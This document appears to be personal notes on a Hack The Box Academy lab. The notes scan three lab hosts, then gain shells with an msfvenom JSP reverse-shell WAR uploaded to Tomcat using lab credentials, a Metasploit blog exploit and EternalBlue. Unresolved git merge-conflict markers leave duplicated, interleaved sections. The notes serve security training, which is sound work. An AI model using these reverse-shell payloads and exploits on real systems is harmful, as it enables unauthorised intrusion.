```
10.129.204.126
```

### Host 1

Credentials: htb-student / HTB_@cademy_stdnt!

Host 1: 172.16.1.11:8080
Host 3: 172.16.1.13
Host 2: blog.inlanefreight.local


```
xfreerdp /v:10.129.204.126 /u:htb-student /p:HTB_@cademy_stdnt!
```

#### NMAP Scan: Host 1
```
└──╼ $nmap -A -sC -Pn 10.129.32.8
Starting Nmap 7.92 ( https://nmap.org ) at 2023-10-14 12:19 EDT
Nmap scan report for status.inlanefreight.local (172.16.1.11)
Host is up (0.057s latency).
Not shown: 989 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Inlanefreight Server Status
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2019 Standard 17763 microsoft-ds
515/tcp  open  printer
1801/tcp open  msmq?
2103/tcp open  msrpc         Microsoft Windows RPC
2105/tcp open  msrpc         Microsoft Windows RPC
2107/tcp open  msrpc         Microsoft Windows RPC
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2023-10-14T16:20:08+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=shells-winsvr
| Not valid before: 2023-10-13T16:06:28
|_Not valid after:  2024-04-13T16:06:28
| rdp-ntlm-info: 
|   Target_Name: SHELLS-WINSVR
|   NetBIOS_Domain_Name: SHELLS-WINSVR
|   NetBIOS_Computer_Name: SHELLS-WINSVR
|   DNS_Domain_Name: shells-winsvr
|   DNS_Computer_Name: shells-winsvr
|   Product_Version: 10.0.17763
|_  System_Time: 2023-10-14T16:20:03+00:00
8080/tcp open  http          Apache Tomcat 10.0.11
|_http-open-proxy: Proxy might be redirecting requests
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/10.0.11
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-10-14T16:20:03
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: shells-winsvr
|   NetBIOS computer name: SHELLS-WINSVR\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-10-14T09:20:03-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: SHELLS-WINSVR, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:d5:ed (VMware)
|_clock-skew: mean: 1h23m59s, deviation: 3h07m50s, median: 0s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.75 seconds

```

#### Host 1 IPs and Domain Names

172.16.1.11  status.inlanefreight.local
172.16.1.12  blog.inlanefreight.local
10.129.201.134  lab.inlanefreight.local

#### Start firefox
```
/usr/bin/firefox
```
#### War Reverse Shell
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.1.5 LPORT=4444 -f war > reverse.war
```

#### Use Metasploit to Setup the Listener
```
msf5> use exploit/multi/handler  
msf5> set payload windows/meterpreter/reverse_tcp  
msf5> set LHOST 172.16.1.5 
msf5> set LPORT 4444  
msf5> run
```
#### Credentials

For Apache Tomcat
```
tomcat:Tomcatadm
```

#### Tomcat login

**Login Page**
```
http://172.16.1.11:8080
```

#### Netcat worked, Metasploit didnt
```
netcat -nlvp 4444
```

#### Curl Post Request
```
curl --upload-file reverse.war -u 'tomcat:Tomcatadm' "http://status.inlanefreight.local"
```

#### Upload the reverse.war file
```
curl -d @reverse2.war http://status.inlanefreight.local/form1
```


### Host 2:
```bash
blog.inlanefreight.local
```

<<<<<<< HEAD
``` bash
xfreerdp /v:10.129.96.208 /u:htb-student /p:HTB_@cademy_stdnt!
```

#### NMAP Scan
```
Starting Nmap 7.92 ( https://nmap.org ) at 2023-10-23 18:07 EDT
Nmap scan report for blog.inlanefreight.local (172.16.1.12)
Host is up (0.048s latency).
=======
**domain name**
```
blog.inlanefreight.local
```

**nmap scan**
```
nmap -A -sV -Pn blog.inlanefreight.local

Starting Nmap 7.92 ( https://nmap.org ) at 2023-10-18 21:35 EDT
Nmap scan report for blog.inlanefreight.local (172.16.1.12)
Host is up (0.064s latency).
>>>>>>> c8db846 (updating)
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 f6:21:98:29:95:4c:a4:c2:21:7e:0e:a4:70:10:8e:25 (RSA)
|   256 6c:c2:2c:1d:16:c2:97:04:d5:57:0b:1e:b7:56:82:af (ECDSA)
|_  256 2f:8a:a4:79:21:1a:11:df:ec:28:68:c2:ff:99:2b:9a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
<<<<<<< HEAD
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Inlanefreight Gabber
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.43 seconds

```

#### Host IP
```
172.16.1.12
```

#### Credentials
=======
|_http-title: Inlanefreight Gabber
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.78 seconds
```

>>>>>>> c8db846 (updating)
For blog.inlanefreight.local
```
admin:admin123!@#
```

<<<<<<< HEAD

Open metasploit and type
```
use exploit/50064
```

![[use_50064.png]]

When running the exploit I receive this error:
```
Exploit failed: NoMethodError undefined method `split' for nil:NilClass
```

Forums say to use a bind shell [Live Engagement Forum](https://forum.hackthebox.com/t/academy-hack-the-box-shells-payloads-the-live-engagement-lightweight-facebook-styled-blog-1-3/248998/35?page=3)

You just need to set the VHOST to blog.inlanefreight.local

### Host 3:

```
xfreerdp /v:10.129.204.126 /u:htb-student /p:HTB_@cademy_stdnt!
```

#### NMAP Scan
```
nmap -A -sC 172.16.1.13
Starting Nmap 7.92 ( https://nmap.org ) at 2023-10-29 20:27 EDT
Nmap scan report for 172.16.1.13
Host is up (0.061s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: 172.16.1.13 - /
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h19m58s, deviation: 4h02m29s, median: -1s
|_nbstat: NetBIOS name: SHELLS-WINBLUE, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:e7:ed (VMware)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: SHELLS-WINBLUE
|   NetBIOS computer name: SHELLS-WINBLUE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-10-29T17:27:29-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-10-30T00:27:29
|_  start_date: 2023-10-30T00:21:44
```

Ports 135,139 and 445 are open so this means 

**Share name**
```
SHELLS-WINBLUE
```

**Attempting to connect to share via SMBClient**
```
smbclient //SHELLS-WINBLUE/172.16.1.13
```

When attempting to connect it says successful but then says "tree connect failed"
![[smbclient_fail_connect.png]]

Reviewing the NMAP results, it's running Windows Server 2016 Standard 14393. A quick google search reveals this to be vulnerable to eternalblue and select option 1
![[eternalblue.png]]




Set the following options and you'll get a shell
```
set LHOST 172.16.1.5
```
```
set RHOST 172.16.1.13
```

![[run_exploit.png]]

###### Potential Mitigations:

Consider the list below when considering what implementations you can put in place to mitigate many of these vectors or exploits.

- `Application Sandboxing`: By sandboxing your applications that are exposed to the world, you can limit the scope of access and damage an attacker can perform if they find a vulnerability or misconfiguration in the application.
    
- `Least Privilege Permission Policies`: Limiting the permissions users have can go a long way to help stop unauthorized access or compromise. Does an ordinary user need administrative access to perform their daily duties? What about domain admin? Not really, right? Ensuring proper security policies and permissions are in place will often hinder if not outright stop an attack.
    
- `Host Segmentation & Hardening`: Properly hardening hosts and segregating any hosts that require exposure to the internet can help ensure an attacker cannot easily hop in and move laterally into your network if they gain access to a boundary host. Following STIG hardening guides and placing hosts such as web servers, VPN servers, etc., in a DMZ or 'quarantine' network segment will stop that type of access and lateral movement.
    
- `Physical and Application Layer Firewalls`: Firewalls can be powerful tools if appropriately implemented. Proper inbound and outbound rules that only allow traffic first established from within your network, on ports approved for your applications, and denying inbound traffic from your network addresses or other prohibited IP space can cripple many bind and reverse shells. It adds a hop in the network chain, and network implementations such as Network Address Translation (NAT) can break the functionality of a shell payload if it is not taken into account.
=======
**IP**
```
172.16.1.12
```
>>>>>>> c8db846 (updating)
